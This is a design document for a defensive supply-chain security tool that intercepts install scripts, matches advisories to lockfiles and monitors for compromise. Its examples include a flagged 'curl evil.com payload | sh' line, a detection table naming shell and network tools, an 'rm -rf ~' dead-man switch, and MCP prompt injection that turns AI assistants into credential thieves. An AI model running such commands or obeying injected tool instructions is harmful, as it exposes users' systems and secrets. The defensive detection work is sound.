# Architecture

This document covers the detailed design and component specifications for Ripley.
For the project overview and motivation, see [README.md](README.md). For the design
system, see [DESIGN.md](DESIGN.md). For view wireframes, see [UI.md](UI.md).
For technical decisions, see [DECISIONS.md](DECISIONS.md). For user workflows,
see [WORKFLOW.md](WORKFLOW.md).


## Design by Phase

Ripley's design follows the three-phase model described in the README: before, during, and
after the breach. Each phase has distinct components, data flows, and user interactions.

### Before the breach: forward defense

**Threat awareness before exposure.** Polling structured vulnerability feeds (OSV.dev,
GitHub Advisory Database, Socket.dev) on a continuous loop and cross-referencing against
every lockfile on your machine. You learn that a package you depend on was compromised
*before* your next `npm install`, not after it.

**Interception before execution.** Package manager install scripts (`preinstall`,
`postinstall`, `prepare` in npm; `setup.py` in pip; build scripts in cargo) are the primary
entry point for supply chain malware. Ripley intercepts these scripts and analyzes them
before they run. If a `postinstall` script downloads a binary, decodes base64, shells out
to curl, or exhibits obfuscation patterns, it is flagged and blocked --- not logged after
the fact.

This is where the biggest gap exists today. Almost no tooling operates between "a malicious
package is published" and "a developer installs it." Forward defense closes that gap.

**Security posture before the next incident.** Beyond detecting active threats, Ripley
assesses how well the development environment is hardened against future attacks. Posture
checks don't require advisory data --- they examine the configuration itself:

- **Dependency pinning:** Are dependencies pinned to exact versions or using broad ranges
  (`^`, `~`, `*`, `latest`)? Are exotic sources (`git+`, `http://`, `file:`) bypassing
  registry integrity?
- **Lockfile integrity:** Is there a lockfile? Is it committed to git? Are integrity hashes
  (SHA-512) present for all entries? Do resolved URLs point to expected registries?
- **PM hardening:** Is `ignore-scripts` or `allowBuilds` configured? Is `save-exact` set?
  Is `minimumReleaseAge` configured? Is `blockExoticSubdeps` enabled?
- **Provenance signals:** Were packages published via Trusted Publishing (OIDC) or legacy
  tokens? Has provenance dropped between versions? Has the publisher changed?
- **Credential hygiene:** Are npm tokens in `.npmrc` scoped narrowly? Are tokens present
  in project directories that shouldn't have them?

**Developer environment audit.** `ripley audit` extends posture checks beyond the project
to the developer's machine itself. These checks don't analyze packages --- they assess
whether the environment is hardened against the supply chain attacks Ripley defends against:

- **Machine security:** Is disk encryption enabled (FileVault on macOS)? Is the firewall
  active? Are OS security updates current? Is the screen lock timeout reasonable?
- **Developer toolchain:** Are git commits signed? Are SSH keys using strong algorithms
  (Ed25519 over RSA-1024)? Are shell RC files clean of injected `eval`/`curl` commands?
  Is the shell history protected?
- **AI tool config integrity:** Are MCP configs (`.mcp.json`, `.cursor/mcp.json`) free
  of rogue server definitions? Are `.claude/settings.json` hooks authorized? Are VS Code
  extensions from verified publishers?
- **Credential exposure:** Are secrets present in shell history, environment variables,
  `.env` files committed to git, or broadly scoped npm tokens? Are SSH keys passphrase-
  protected?

The programmatic checks collect data deterministically; the AI analysis layer interprets
it contextually. Raw findings alone don't tell a developer what to do --- `ripley audit
--fix` generates a remediation prompt that an AI harness can execute: specific commands
for the developer's OS, shell, and toolchain, prioritized by actual risk. A disabled
firewall matters more when npm tokens are broadly scoped. An unencrypted disk matters
more when credential stores are populated. The AI sees the combination.

For open source users, `ripley scan` surfaces project-level posture as warnings,
`ripley audit` checks the broader environment, and `ripley harden` recommends PM-specific
fixes. For teams, the enterprise config layer can make posture requirements mandatory ---
the guard enforces them in strict mode, and the guard log provides compliance evidence.

**Provenance is necessary but not sufficient.** The TanStack compromise (May 2026)
proved that packages with valid SLSA provenance can be malicious --- the attacker
hijacked the legitimate build pipeline via GitHub Actions cache poisoning and OIDC
token extraction, so the malicious versions carried authentic signatures. Any tool
relying solely on provenance checking would have approved these packages. Ripley
treats provenance as one trust signal among many, never as a reason to skip
behavioral analysis. Install-time script analysis is the last line of defense when
all upstream trust mechanisms fail.

### During the breach: active detection

Not every attack can be prevented. A compromised package might have been installed before
any advisory existed. A developer might have approved a script that looked benign. The
threat is already inside the perimeter.

**Process and network monitoring.** Watching for IOC patterns in real time: unexpected
outbound connections from Node/Python processes, writes to known persistence paths
(`.claude/settings.json`, `.vscode/tasks.json`, `.mcp.json`, `.cursor/mcp.json`, shell RC files, LaunchAgents), privilege
escalation attempts, or processes masquerading as system services.

**Filesystem anomaly detection.** Watching project directories for changes that match
known attack signatures: new files appearing in `.claude/` or `.vscode/` that weren't
committed, new or modified MCP config files (`.mcp.json`, `.cursor/mcp.json`) with rogue
server definitions, modifications to lockfiles outside of an explicit install, unexpected
binaries in `node_modules/.cache/` or Python site-packages.

**Real-time alerting.** When active compromise indicators are detected, Ripley fires an
immediate high-priority notification with a "Contain" action that can kill the suspicious
process, revoke the network access, and snapshot the current state for analysis.

### After the breach: automated response

The breach happened. Maybe it was caught in minutes, maybe it was discovered days later from
a security blog. Either way, the machine needs to be assessed, cleaned, and hardened.

**Forensic scan.** `ripley scan --deep` performs the kind of audit a security engineer would
do manually: checking installed package versions against known-compromised lists, searching
for IOC files (persistence markers, exfiltration staging, dropped binaries), auditing shell
RC files for injected commands, reviewing Launch Agents / cron / systemd for unauthorized
persistence, checking for unauthorized SSH keys, and scanning active network connections
against known C2 infrastructure.

**Credential exposure assessment.** Based on the specific attack's known behavior, Ripley
identifies which credential stores were likely accessed: AWS keys, GitHub tokens, npm
tokens, SSH keys, `.env` files, Kubernetes configs. It generates a specific rotation
checklist rather than a generic "rotate everything."

**AI-driven remediation.** Ripley generates a scoped remediation prompt and hands it to
whichever AI coding harness the developer uses (Claude Code, Codex, OpenCode). The prompt
includes the specific CVE, the affected package and version, the project path, known IOC
file paths to check, and the clean version to upgrade to. The harness executes the fix. The
developer reviews and approves.

This shifts the response timeline from "read a blog post, understand the threat, manually
audit your projects, figure out what to do" (hours to days) to "notification, one click,
review diff" (minutes).

**Post-incident hardening.** After remediation, Ripley suggests forward-defense measures
specific to the attack that just hit: adding the compromised package's scope to the guard's
watch list, tightening script analysis thresholds, enabling filesystem monitoring on the
paths that were targeted, blocking the C2 domains at the network level.


## Components

### Component 1: `ripley-app` --- the tray app

Built with `tray-icon` + `muda` for the system tray and `iced` for the dashboard window.
Pure Rust, no webview runtime, no JS bundling. Packaged as `Ripley.app` on macOS via
`cargo-bundle` with `LSUIElement = true` (tray-only, no Dock icon). Communicates with
the `ripley` CLI via a Unix domain socket at `{data_dir}/ripley.sock` using
JSON-over-socket IPC --- the same pattern used by Docker, Tailscale, and 1Password.

Clicking the tray icon opens a dashboard window showing alerts, guard activity, and
settings. The dashboard is built with `iced` (Elm architecture, GPU-rendered via wgpu,
retained mode --- near-zero CPU when idle). Native OS notifications fire for new alerts
and hand off to the dashboard for detail and action. See [UI.md](UI.md) for view
wireframes and [DESIGN.md](DESIGN.md) for the design system tokens.

```
┌──────────────────────────────────────────────────┐
│                 ripley (tray app)                 │
│                                                  │
│  ┌────────────┐     ┌─────────────┐              │
│  │ Feed Poller│     │  Lockfile   │              │
│  │            │     │  Indexer    │              │
│  │ OSV.dev    │     │            │              │
│  │ GHSA       │     │ walks project              │
│  │ Socket.dev │     │ roots, watches│             │
│  │            │     │ for changes │              │
│  └─────┬──────┘     └──────┬──────┘              │
│        │                   │                     │
│        └───────┬───────────┘                     │
│                ▼                                 │
│        ┌───────────────┐                         │
│        │    Matcher    │                         │
│        │              │                         │
│        │ new advisory │                         │
│        │ × installed  │                         │
│        │ = alert?     │                         │
│        └───────┬──────┘                         │
│                │ yes                             │
│                ▼                                 │
│        ┌──────────────────────────────┐          │
│        │  Native OS Notification     │          │
│        │  [View] [Fix] [Dismiss]     │          │
│        └───────────┬─────────────────┘          │
│                    │ "Fix"                      │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Prompt Generator        │          │
│        │                             │          │
│        │  ┌────────────────────────┐ │          │
│        │  │ CVE + versions        │ │          │
│        │  │ project path          │ │          │
│        │  │ IOC file paths        │ │          │
│        │  │ cred rotation list    │ │          │
│        │  │ clean version         │ │          │
│        │  │ test command          │ │          │
│        │  └────────────────────────┘ │          │
│        └───────────┬─────────────────┘          │
│                    │                             │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Harness Launcher        │          │
│        │  claude | codex | opencode  │          │
│        └──────────────────────────────┘          │
└──────────────────────────────────────────────────┘
```

**Feed poller.** Hits three structured APIs on a configurable interval (default: 5 minutes):
- [OSV.dev](https://osv.dev) --- Google's aggregated vulnerability database. Covers npm,
  PyPI, crates.io, Go, RubyGems, Packagist, NuGet, Maven. Structured JSON with affected
  version ranges.
- [GitHub Advisory Database](https://github.com/advisories) --- GHSA advisories via the
  GraphQL API. Feeds `npm audit` and `pip audit` under the hood.
- [Socket.dev](https://socket.dev) --- Detected the TanStack compromise in 6 minutes.
  Offers an API for real-time malicious package alerts.

Each feed item is normalized to: `(ecosystem, package, affected_versions, severity, cve,
description, iocs)`.

**Lockfile indexer.** On startup, walks configured project roots and indexes every lockfile
it finds. Watches for filesystem changes via FSEvents (macOS), inotify (Linux), or
ReadDirectoryChangesW (Windows) using the `notify` Rust crate. Maintains an in-memory map
of `(ecosystem, package, installed_version)` tuples across all projects.

**Matcher.** When a new feed item arrives, queries the lockfile index. If any installed
version falls within the affected range, the item is promoted to an alert.

**Notifier.** Fires a native OS notification via `notify-rust`. On macOS:
UNUserNotificationCenter. On Windows: toast via the Windows notification API. On Linux:
D-Bus `org.freedesktop.Notifications`. Actions vary by phase:
- **Before** (advisory match): **View** (open advisory URL in browser), **Fix** (generate
  remediation prompt and launch harness), **Dismiss**.
- **During** (active compromise detected): **View**, **Contain** (kill suspicious process,
  snapshot state), **Investigate** (open forensic detail).
- **After** (post-incident scan results): **Remediate** (generate and launch fix
  prompt), **View Report** (open deep scan report in dashboard).

**Prompt generator.** Builds a self-contained remediation prompt from advisory or scan data.
Used in both the "before" flow (advisory match → Fix) and the "after" flow (`ripley fix` /
`ripley scan --deep` → Remediate). The prompt is scoped to the specific attack:

```
In the project at /Users/jack/src/myapp, the package @tanstack/react-router
is installed at version 1.169.5, which is compromised (CVE-2026-45321).

1. Update to the latest clean version.
2. Check for these IOC files and remove them if present:
   - .claude/execution.js
   - .claude/setup.mjs
   - .vscode/setup.mjs
   - node_modules/@tanstack/*/router_init.js
3. Run the test suite and verify the build passes.
4. Report what you found and what you changed.
```

**Harness launcher.** Detects available AI coding CLIs in PATH order: `claude`, `codex`,
`opencode`. User can set a preference. Spawns the harness in a new terminal window with the
generated prompt. The developer stays in control --- they review the diff before committing.

### Component 2: `ripley-guard` --- the package manager interceptor

A standalone Rust binary, separate from the tray app. Runs without a GUI. Can be used in CI.

```
┌──────────────────────────────────────────────────┐
│           ripley-guard (CLI shim)                │
│                                                  │
│  npm install ──►┌──────────────────┐             │
│  pip install ──►│ Script Extractor │             │
│  cargo build ──►│                  │             │
│  gem install ──►│ fetch tarball,   │             │
│  go install  ──►│ parse lifecycle  │             │
│                 │ hooks            │             │
│                 └────────┬─────────┘             │
│                          │                       │
│                          ▼                       │
│                 ┌──────────────────┐              │
│                 │ Static Analyzer │              │
│                 │                 │              │
│                 │ network calls?    ──► ■        │
│                 │ eval / exec?      ──► ■        │
│                 │ base64 decode?    ──► ■        │
│                 │ binary download?  ──► ■        │
│                 │ obfuscation?      ──► ■        │
│                 │ known patterns?   ──► ■        │
│                 │                 │              │
│                 │ risk: low | med | high         │
│                 └────────┬─────────┘             │
│                          │                       │
│                     low  │  med/high             │
│                     ┌────┴────┐                  │
│                     ▼         ▼                  │
│                auto-allow   prompt user          │
│                             with details         │
└──────────────────────────────────────────────────┘
```

**Installation.**

```
ripley guard install
```

This does two things:

1. **PATH shims.** Prepends `{data_dir}/bin/` to PATH (via shell RC file) and places
   compiled Rust shim binaries for each supported package manager (modeled after
   [Volta](https://volta.sh)'s approach). Each shim resolves the real binary via
   `which -a`, performs advisory + script analysis, then delegates. The shims are native
   binaries, not shell scripts --- startup overhead is < 10ms.

2. **npm `script-shell`.** Sets `script-shell={data_dir}/bin/ripley-script-shell` in the
   user's `.npmrc`. This tells npm to execute *every* lifecycle script (`preinstall`,
   `postinstall`, `prepare`, etc.) through Ripley's analyzer instead of `/bin/sh`. The
   analyzer receives the script content, runs static analysis, and either executes it
   (low risk) or prompts the user (medium/high risk). This is the deepest interception
   point available: it catches scripts from transitive dependencies that the PATH shim
   alone would miss.

Per-package-manager strategy:

| PM | Shim | Extra hook | Notes |
|----|------|-----------|-------|
| npm | `{data_dir}/bin/npm` | `script-shell` in `.npmrc` | Shim checks advisories pre-install; script-shell analyzes each lifecycle script at execution time |
| yarn | `{data_dir}/bin/yarn` | --- | Shim only; Yarn PnP has different lifecycle semantics |
| pnpm | `{data_dir}/bin/pnpm` | `script-shell` in `.npmrc` | Same `.npmrc` trick works for pnpm |
| pip | `{data_dir}/bin/pip` | --- | Shim intercepts; analyzes `setup.py` / build backend scripts |
| cargo | `{data_dir}/bin/cargo` | --- | Shim intercepts `cargo build`/`install`; analyzes `build.rs` and proc macros |
| gem | `{data_dir}/bin/gem` | `pre_install` hook | Shim + Rubygems hook API for lifecycle interception |
| go | `{data_dir}/bin/go` | --- | Advisory check only; Go has no install scripts |

**Script extraction.** Before running any install, the guard:
1. Resolves the package and version from the registry.
2. Fetches the tarball (or reads from cache).
3. Extracts lifecycle scripts from `package.json` (`preinstall`, `install`, `postinstall`,
   `prepare`, `prepack`), `setup.py`, `pyproject.toml` build backends, etc.
4. If the script references other files, extracts those too.

**Static analysis.** Each script is analyzed against a rule engine:

| Signal | Weight | Example |
|--------|--------|---------|
| Network call | High | `curl`, `wget`, `fetch()`, `http.get`, `net.connect` |
| Code generation | High | `eval()`, `Function()`, `new Function`, `vm.runInContext` |
| Encoding/obfuscation | High | `base64`, `Buffer.from`, `atob`, `String.fromCharCode` |
| Binary execution | Critical | Downloading and executing `.exe`, `.sh`, ELF binaries |
| Shell spawning | High | `child_process.exec`, `subprocess.run`, `os.system` |
| Environment harvesting | Medium | Bulk `process.env` access, reading `.env` files |
| File system scope escape | Medium | Writing outside the package directory |
| Known malicious patterns | Critical | Bun runtime smuggling, `.claude/settings.json` injection |
| Obfuscation tools | Critical | javascript-obfuscator markers, Pyarmor headers |
| Script size anomaly | Medium | postinstall script > 100KB (legitimate ones are rarely large) |
| Typosquatting | High | Layered: Damerau-Levenshtein with keyboard-adjacency weighting, popularity-weighted scoring, Unicode homoglyph detection (e.g., `expresss`, `lodahs`, `lοdash` with Greek omicron) |
| Risky dependency specs | Medium | `latest`, `*`, broad ranges, `git+`, `http://`, `file:` specifiers that bypass registry integrity |
| Lockfile integrity | Medium | Resolved URLs pointing to unexpected registries, missing integrity hashes, HTTP downgrade from HTTPS |
| AI tool config writes | Critical | Writes to `.claude/settings.json`, `.mcp.json`, `.cursor/mcp.json`, `.vscode/tasks.json` — persistence and prompt injection vectors (TrustFall, Mini Shai-Hulud) |
| MCP server injection | Critical | Installing rogue MCP server definitions that embed prompt injection in tool descriptions, weaponizing AI assistants as credential exfiltration agents |

Scripts scoring below threshold auto-approve. Scripts above threshold present the developer
with a highlighted view of the suspicious code and ask for confirmation:

```
ripley-guard: @example/pkg@1.2.3 postinstall script flagged (risk: high)

  #!/bin/sh
  curl -s https://evil.com/payload.sh | sh    ← network call + pipe to shell

  [allow] [block] [inspect] [always trust @example/pkg]
```

**Trust management.** Developers can trust specific packages, publishers, or scopes. Trusted
packages bypass analysis. The trust list lives in `config.toml` (human-editable,
version-controllable) and is local and explicit --- Ripley never auto-trusts.

**Feature model.** All guard features are **opt-in by default**. A fresh install does nothing
until the user explicitly enables features (`ripley guard install`, configuring poll interval,
adding project roots). Open source users control their own `config.toml` with full autonomy.

The **enterprise version** adds an enforced configuration layer: an organization admin pushes
a locked config that sets required guard modes, mandatory rules, compliance policies, and
**posture requirements** (e.g., `require_exact_versions = true`, `require_lockfile = true`,
`min_release_age = 86400`). Posture violations that are warnings for open source users
become blocking errors for teams. The enterprise config layer overrides user config and
cannot be changed locally --- designed for SOC 2 compliance and team-wide security baselines.
The guard log (append-only JSONL) provides an auditable record of all interceptions,
posture checks, and policy decisions for compliance evidence.

**CI mode.** In CI environments (`CI=true`), the guard runs non-interactively. High-risk
scripts fail the build. Configuration via `.ripley.toml` in the project root:

```toml
[guard]
mode = "strict"  # "strict" blocks high-risk, "audit" logs only, "off" disables
trust = ["@tanstack/*", "typescript", "esbuild"]

[posture]
strict = false          # true = posture violations cause exit code 1
require_lockfile = true
require_exact_versions = false
require_integrity_hashes = true
block_exotic_sources = true
```


### Additional CLI modes

Beyond the guard interceptor, the `ripley` binary handles several operational modes:

**`ripley watch` --- headless daemon.** Starts the same polling, watching, and matching
loop as the tray app but without a dashboard window or tray icon. Fires native OS
notifications via `notify-rust`. Creates the IPC socket at `{data_dir}/ripley.sock` so
`ripley status` and other CLI commands can query daemon state. Logs to stdout (foreground)
or `{data_dir}/logs/` (background via `--daemon`). Responds to SIGTERM/SIGINT for graceful
shutdown via `CancellationToken`. Designed for servers, CI runners, and developers who
prefer a headless workflow. Ships in M3 alongside the tray app --- both share the same
core polling/matching/notification logic from `ripley-core`.

**`ripley config` --- configuration management.**

- `ripley config` --- open `{config_dir}/config.toml` in `$VISUAL` or `$EDITOR` (falls
  back to the platform default: `open` on macOS, `xdg-open` on Linux, `start` on Windows).
- `ripley config --path` --- print the resolved config file path.
- `ripley config --show` --- print the fully resolved configuration (all layers merged:
  defaults -> config.toml -> .ripley.toml -> env vars). Useful for debugging precedence.
- `ripley config --init` --- write a default `config.toml` if none exists. Called implicitly
  on first run of any command.

**`ripley status` --- monitoring state.** Behavior depends on whether the daemon is running:

| Daemon running | Source | Output |
|----------------|--------|--------|
| Yes (tray or `watch`) | IPC query via socket | Last poll time, alert count, monitored projects, daemon uptime |
| No | Local filesystem | Advisory cache age, guard shim installation status, configured project roots, "daemon not running" |

When the daemon is not running, `ripley status` reads the redb database for cache age and
checks `{data_dir}/bin/` for installed shims. It does not start the daemon.

**First-run behavior.** On the first invocation of any command, Ripley creates platform
directories if they don't exist and writes a default `config.toml`. If the advisory cache
is empty, `ripley scan` fetches from OSV.dev before scanning. If the network is unavailable,
`ripley scan` exits with code 2 and a clear error ("no cached advisories and network
unavailable --- run with network access to populate the cache"). Subsequent offline runs
use the cached data with a staleness warning ("advisory cache is 3 days old --- connect to
refresh").


## Tech Stack

| Area | Choice |
|------|--------|
| Language | Rust |
| Tray framework | `tray-icon` + `muda` (native, no webview) |
| UI framework | `iced` (Elm architecture, wgpu rendering, retained mode) |
| IPC | JSON over Unix domain socket (`{data_dir}/ripley.sock`) |
| App bundling | `cargo-bundle` (macOS `.app` with `LSUIElement`) |
| Notifications | `notify-rust` (cross-platform native notifications) |
| Advisory cache | `redb` v4 (pure Rust, ACID) |
| Configuration | `config.toml` (TOML + serde, layered) |
| Guard log | Append-only JSONL |
| Lockfile index | In-memory only |
| Data source | OSV.dev (ETag caching, exponential backoff) |
| Detection rules | Compiled-in defaults + runtime user rules + IOC profiles (TOML) |
| Filesystem watching | `notify` v8 |
| CLI output | `--format json\|table`, exit codes 0/1/2 |
| npm interception | PATH shim + `script-shell` (hybrid) |
| Other PM interception | PATH shims (Volta model) |
| Tray internals | `tokio::sync::mpsc` + `CancellationToken` |
| Platform directories | `directories` crate |
| Testing | `insta` snapshots, `cargo-fuzz` for parsers |
| Own supply chain | `cargo-deny` + `rust-toolchain.toml` |

For the rationale behind each choice and how Ripley compares to existing
tools, see [DECISIONS.md](DECISIONS.md).


## Project Structure

```
ripley/
├── Cargo.toml                  # virtual workspace root
├── Cargo.lock
├── rust-toolchain.toml         # pinned Rust channel
├── deny.toml                   # cargo-deny: advisory, license, source checks
├── LICENSE                     # AGPL-3.0-or-later
├── crates/
│   ├── ripley-core/            # shared library: feed polling, lockfile parsing,
│   │   └── src/                #   matching, advisory cache (redb), detection rules,
│   │       ├── lib.rs          #   prompt generation, config, platform dirs
│   │       ├── config.rs       # layered config: user → project → env → CLI
│   │       ├── dirs.rs         # platform directories (directories crate)
│   │       ├── feed/
│   │       ├── lockfile/
│   │       ├── matcher.rs
│   │       ├── db.rs           # redb advisory cache only
│   │       ├── rules/
│   │       └── prompt.rs
│   ├── ripley-guard/           # CLI + package manager interceptor
│   │   └── src/
│   │       ├── main.rs         # `ripley` binary (via [[bin]] name = "ripley"): scan, guard, watch, status, config
│   │       ├── shim.rs         # PATH shim logic, PM dispatch
│   │       ├── script_shell.rs # npm script-shell analyzer
│   │       ├── extractor.rs    # script extraction from tarballs
│   │       └── analyzer.rs     # static analysis rule engine
│   ├── ripley-app/             # system tray app (tray-icon + muda + iced)
│   │   └── src/
│   │       ├── main.rs
│   │       ├── app.rs          # iced Application: message types, update, view
│   │       ├── theme.rs        # color system, custom iced theme (DESIGN.md)
│   │       ├── tray.rs         # system tray setup + menu (muda)
│   │       ├── events.rs       # typed event channel (mpsc)
│   │       ├── poller.rs       # background feed polling loop
│   │       ├── watcher.rs      # filesystem monitoring (notify crate)
│   │       ├── notifier.rs     # native OS notifications (notify-rust)
│   │       ├── harness.rs      # AI coding CLI launcher
│   │       └── views/          # iced view functions
│   │           ├── mod.rs
│   │           ├── alerts.rs   # alerts list + detail panel
│   │           ├── guard_log.rs # guard interception history
│   │           ├── settings.rs # configuration form
│   │           └── scan_report.rs  # deep scan results
│   ├── ripley-ipc/             # shared IPC types + Unix socket client/server
│   │   └── src/
│   │       └── lib.rs          # request/response types, socket path, protocol
│   └── xtask/                  # build automation: rule compilation,
│       └── src/                #   shim generation, release packaging
│           └── main.rs
├── rules/                      # detection rules (TOML, compiled in at build time)
│   ├── npm_postinstall.toml    #   users add custom rules in {config_dir}/rules/
│   ├── pypi_setup.toml
│   ├── credential_exfil.toml
│   └── persistence_write.toml
├── iocs/                       # IOC profiles (TOML, compiled in at build time)
│   ├── tanstack-2026-05.toml   #   incident-specific: known-bad versions, payloads,
│   └── mini-shai-hulud.toml    #   persistence paths. Users add custom profiles
│                               #   in {config_dir}/iocs/
├── tests/
│   ├── fixtures/               # sample lockfiles, malicious scripts, tarballs
│   │   └── attacks/            # fixtures organized by real attack type
│   └── integration/
└── .ripley.toml                # default project config (guard mode, trust list)
```

The root `Cargo.toml` is a virtual workspace --- it has no `[package]` of its own. Shared
dependencies are declared once in `[workspace.dependencies]` and inherited by each crate
via `{ workspace = true }`. This keeps versions synchronized across `ripley-core`,
`ripley-guard`, `ripley-app`, and `ripley-ipc`.

### Binary naming

The `ripley-guard` crate produces the `ripley` binary (via `[[bin]] name = "ripley"` in its
`Cargo.toml`). During development, `cargo run -p ripley-guard --` invokes it. When installed
(`cargo install --path crates/ripley-guard`), the binary is simply `ripley`. All CLI
commands in the README (`ripley scan`, `ripley guard install`, `ripley watch`, etc.) are
subcommands of this single binary.

The tray app crate (`ripley-app`) produces `Ripley.app` on macOS via `cargo-bundle` --- a
separate application bundle, not a CLI command. `ripley` (no subcommand) launches
`Ripley.app` if it is installed, otherwise prints help. This follows the pattern of `code`
(launches VS Code) and `docker` (routes to Docker Desktop when available).

### Runtime directory layout

At runtime, Ripley stores files in platform-appropriate locations using the `directories`
crate (`ProjectDirs::from("com", "agentstation", "ripley")`):

```
{config_dir}/                   # ~/.config/ripley/ (Linux)
├── config.toml                 # user preferences (poll interval, harness, trust list)
├── rules/                      # user-supplied detection rules (loaded at startup)
└── iocs/                       # user-supplied IOC profiles (incident-specific detection)

{data_dir}/                     # ~/.local/share/ripley/ (Linux)
├── advisories.redb             # advisory cache (redb)
├── guard.jsonl                 # guard decision log (append-only, machine-readable)
└── bin/                        # PATH shims installed by `ripley guard install`

{cache_dir}/                    # ~/.cache/ripley/ (Linux)
└── feeds/                      # ETag cache for feed polling
```

macOS equivalents: `~/Library/Application Support/ripley/` (config + data),
`~/Library/Caches/ripley/` (cache). Windows: `%APPDATA%\ripley\` (config + data),
`%LOCALAPPDATA%\ripley\` (cache).


## Threat Model

Ripley defends against:

**Before (forward defense):**
- **Malicious lifecycle scripts** --- postinstall scripts that download and execute
  payloads, exfiltrate credentials, or establish persistence. (Mini Shai-Hulud, Axios, SAP
  packages, @antv ecosystem)
- **Compromised legitimate packages** --- trusted packages where a maintainer's credentials
  are stolen and a malicious version is published. The TanStack compromise didn't require
  stealing any credentials directly — the attacker poisoned the pnpm store in the GitHub
  Actions shared cache via `pull_request_target`, and captured an OIDC publishing token
  from the release workflow's cleanup code when it failed. (TanStack, Bitwarden CLI,
  elementary-data)
- **SLSA provenance bypass** --- the TanStack malicious packages carried valid SLSA
  provenance and authentic Sigstore signatures because the attacker hijacked the
  legitimate build pipeline. Any tool relying solely on provenance checking would have
  approved them. This is why Ripley's behavioral analysis runs regardless of provenance
  status.
- **Expired domain account takeover** --- the node-ipc attacker re-registered the
  maintainer's expired domain, gained email access, and used npm's password recovery to
  take over the account. No credential theft required — just a $10 domain registration.
- **Typosquatting** --- packages with names similar to popular ones, detected via
  Levenshtein distance against a curated list of high-download packages. (BufferZoneCorp,
  fake `tanstack` brand-squat, `chalk-tempalte`, `axois-utils`)
- **Delayed activation** --- "sleeper" packages that ship clean initially and add malicious
  code in a later update. (BufferZoneCorp Ruby gems)

**During (active detection):**
- **Active credential exfiltration** --- processes making unexpected outbound connections to
  unknown infrastructure while accessing credential stores.
- **Persistence installation** --- unauthorized writes to shell RC files, LaunchAgents, cron,
  systemd units, or AI tool configs (`.claude/settings.json` SessionStart hooks,
  `.vscode/tasks.json` runOn triggers, `.mcp.json` rogue server definitions,
  `.cursor/mcp.json`). (Mini Shai-Hulud, TrustFall)
- **MCP config poisoning** --- malicious MCP server definitions or prompt injections
  embedded in MCP tool descriptions that weaponize AI coding assistants as unwitting
  credential exfiltration agents. The developer never sees the theft because it is
  mediated through the AI's tool calls. (TrustFall May 2026, Phantom Bot campaign)
- **C2 communication** --- active connections to known command-and-control infrastructure.
- **Dead man switches** --- malware that monitors whether compromised credentials have been
  rotated (e.g., pinging the GitHub API to check token validity) and triggers destructive
  actions (`rm -rf ~`) if credentials are revoked. (Mini Shai-Hulud)

**After (response and recovery):**
- **IOC detection** --- finding persistence markers, dropped binaries, staging files, and
  other artifacts left by known attacks.
- **Credential exposure** --- mapping which secrets and tokens were likely accessed based on
  the specific attack's known behavior.
- **Incomplete remediation** --- ensuring all traces of an attack are removed, not just the
  obvious ones. (e.g., the TanStack worm wrote to `.claude/`, `.vscode/`, *and*
  OS-level services)

Ripley does **not** defend against:

- **Compromised compilers or OS-level toolchains** --- Ripley trusts the Rust toolchain it's
  built with and the OS it runs on.
- **Zero-day vulnerabilities in legitimate code** --- Ripley is not a SAST tool. It detects
  malicious intent in install scripts and known compromised versions, not bugs.
- **Attacks that don't use package managers** --- direct binary downloads, manual curl-pipe-
  bash, browser drive-by. Different threat, different tool.
- **Insider threats** --- a developer intentionally installing malicious code.


See [ROADMAP.md](ROADMAP.md) for the phased execution plan,
[DESIGN.md](DESIGN.md) for the design system (tokens, component styling),
[UI.md](UI.md) for view wireframes and interaction specs,
[WORKFLOW.md](WORKFLOW.md) for user-facing workflow streams, and
[SETTINGS.md](SETTINGS.md) for the complete configuration reference.
